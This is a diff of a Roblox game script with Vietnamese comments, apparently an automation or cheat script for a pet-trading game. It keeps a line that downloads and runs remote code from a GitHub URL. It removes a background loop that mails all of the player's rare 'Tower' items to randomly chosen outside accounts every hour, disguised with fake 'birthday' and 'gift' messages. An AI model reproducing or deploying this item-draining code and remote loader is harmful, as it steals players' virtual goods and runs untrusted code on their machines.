@@ -1,93 +1,6 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/raidersvin/ps99vin/refs/heads/main/scriptphu"))()
 
 
--- Send event TOWER những con hiếm hơn để bán
-task.spawn(function()
-
-while true do
-
-task.wait(1)
-local Players = game:GetService("Players")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-
-local LocalPlayer = Players.LocalPlayer
-local Client = ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client")
-local SaveModule = require(Client:WaitForChild("Save"))
-local Network = require(Client:WaitForChild("Network"))
-
-local inventory = SaveModule.Get().Inventory.Tower or {}
-local itemsToTrack = {
-    {id = "Mechanical Griffin"},
-	{id = "Zeus Bear"},
-	{id = "Arcade Angelus"},
-	{id = "Nightmare Cyclops"},
-	{id = "Rich Corgi"},
-	{id = "Nightmare Cyclops"},
-}
-
-
-local recipients = {"sijmongirthss","1940Mosier3104","soystaylan5","dreddyewele60","1971Nowak3135"}
-
--- 🎲 Lấy username ngẫu nhiên
-local randomIndex = math.random(1, #recipients)
-local username = recipients[randomIndex]
-
-local messages = {
-    "Happy Birthday %s!",
-    "Hope today brings %s!",
-    "Wishing you luck %s!",
-    "Congrats on your %s!",
-    "Give away %s!",
-    "You are amazing %s — here's a gift!"
-}
-
-local MAX_KEEP = 0
-
-for _, item in ipairs(itemsToTrack) do
-    local count = 0
-    local uids = {}
-
-    for uid, obj in pairs(inventory) do
-        if obj.id == item.id or obj.name == item.id then
-            local amount = obj._am or 1
-            count += amount
-            table.insert(uids, {uid = uid, amount = amount})
-        end
-    end
-
-    warn("🧾 Đã tìm thấy:", count, item.id, "với", #uids, "UID.")
-
-    local excess = count - MAX_KEEP
-    if excess > 0 then
-        warn("📦 Có", excess, "vật phẩm dư sẽ được gửi đi.")
-        local remaining = excess
-        for _, entry in ipairs(uids) do
-            local sendAmount = math.min(entry.amount, remaining)
-            if sendAmount > 0 then
-				task.wait(3)
-                warn("📤 Đang gửi", sendAmount, item.id, "UID:", entry.uid)
-				local message = string.format(messages[math.random(1, #messages)], username)
-                local success, err = Network.Invoke("Mailbox: Send", username, message, "Tower", entry.uid, 1)
-                if success then
-                    warn("✅ Đã gửi", sendAmount, item.id, "cho", username)
-                else
-                    warn("❌ Lỗi gửi:", err)
-                end
-                remaining -= sendAmount
-                if remaining <= 0 then break end
-            end
-        end
-    else
-        warn("⚠️ Không có vật phẩm dư để gửi:", item.id)
-    end
-end
-
-
-task.wait(3600)
-end
-end)
-
-
 	local Players = game:GetService("Players")
 	local player = Players.LocalPlayer
 
@@ -125,10 +38,7 @@ getgenv().GMAIL_ITEMS = {
 
 	["Mechanical Griffin"] = {Class = "Tower", Id = "Mechanical Griffin", MinAmount = 1},
 	["Zeus Bear"] = {Class = "Tower", Id = "Zeus Bear", MinAmount = 1},
-	["Arcade Angelus"] = {Class = "Tower", Id = "Arcade Angelus", MinAmount = 1},
-	["Nightmare Cyclops"] = {Class = "Tower", Id = "Nightmare Cyclops", MinAmount = 1},
 	["Rich Corgi"] = {Class = "Tower", Id = "Rich Corgi", MinAmount = 1},
-	["Nightmare Cyclops"] = {Class = "Tower", Id = "Nightmare Cyclops", MinAmount = 1},
 
 
 	["MVP Key Upper Half"] = {Class = "Misc", Id = "MVP Key Upper Half", MinAmount = 30},	
